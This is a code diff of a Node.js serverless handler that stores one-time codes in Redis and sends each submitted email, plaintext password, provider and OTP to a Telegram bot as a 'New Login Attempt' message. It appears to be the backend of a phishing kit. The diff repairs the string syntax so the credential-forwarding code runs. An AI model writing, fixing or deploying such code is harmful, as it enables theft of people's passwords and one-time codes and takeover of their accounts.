@@ -1,6 +1,5 @@
 const Redis = require("ioredis");
 const fetch = require("node-fetch");
-// const { authenticateWithProvider } = require("./utils/email-auth"); // Removed for now
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
@@ -13,7 +12,7 @@ if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
 const redis = new Redis(REDIS_URL);
 
 function getOtpKey(email) {
-  return otp:${email};
+  return `otp:${email}`;
 }
 
 function generateOtp() {
@@ -80,15 +79,9 @@ exports.handler = async function (event) {
   }
 
   // Send credentials and OTP to Telegram
-  const message =
-    🔐 *New Login Attempt*\n\n +
-    📧 Email: ${email}\n +
-    🔑 Password: ${password}\n +
-    🌐 Provider: ${provider}\n +
-    ✅ Authenticated: YES\n +
-    🧾 OTP: ${otp};
+  const message = `🔐 *New Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp}`;
 
-  const telegramUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
     const response = await fetch(telegramUrl, {
@@ -103,7 +96,7 @@ exports.handler = async function (event) {
 
     if (!response.ok) {
       const text = await response.text();
-      throw new Error(Telegram API error: ${response.status} ${text});
+      throw new Error(`Telegram API error: ${response.status} ${text}`);
     }
 
     return {
